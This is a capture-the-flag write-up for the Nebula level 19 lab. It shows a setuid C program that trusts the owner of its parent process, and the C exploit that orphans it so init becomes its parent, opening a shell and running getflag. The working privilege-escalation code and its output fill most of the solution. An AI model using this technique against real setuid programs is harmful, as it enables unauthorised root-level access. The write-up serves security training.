# Nebula - Level 19

### About ###

>There is a flaw in the below program in how it operates.
>
>To do this level, log in as the level19 account with the password level19 . Files for this level can be found in /home/flag19.

### Source code ###

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) {
    printf("Unable to check parent process\n");
    exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
    /* If root started us, it is ok to start the shell */

    execve("/bin/sh", argv, envp);
    err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```

### Solution ###

The shell can be started only if the process's parent is root.

To bypass this protection, a program could launch `/home/flag19/flag19`, then terminates immediately in order to make `/home/flag19/flag19` an orphan process.

That way, `init`, which is started as the user `root`, would get the latter as its child.

To achieve that, the following code is used.

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

int main()
{
	/* The program forks, and the father returns immediately */
    if(fork()) return 0;
    
	/* The child waits one second for its father to die */
    sleep(1);

    int fds[2];									

    /* These commands will be sent to /home/flag19/flag19 via a pipe */	
    char cmd[] = "pwd\nwhoami\ngetflag\nexit\n";

    pipe(fds);			

    /* The child's stdin is closed */							
    close(STDIN_FILENO);

    /* One end of the pipe is set as the new stdin of the process */
    dup2(fds[0], STDIN_FILENO);

    /* The commands are written to the other end of the pipe */
    write(fds[1], cmd, strlen(cmd));
    char *const args[] = { "/bin/sh", NULL };

    /* /home/flag19/flag19 is started */
    execvp("/home/flag19/flag19", args);

    return 0;
}
```

And `getflag` is executed.

```
level19@nebula:/tmp$ gcc -o level19 level19.c
level19@nebula:/tmp$ ./level19
level19@nebula:/tmp$ /tmp
flag19
You have successfully executed getflag on a target account
```
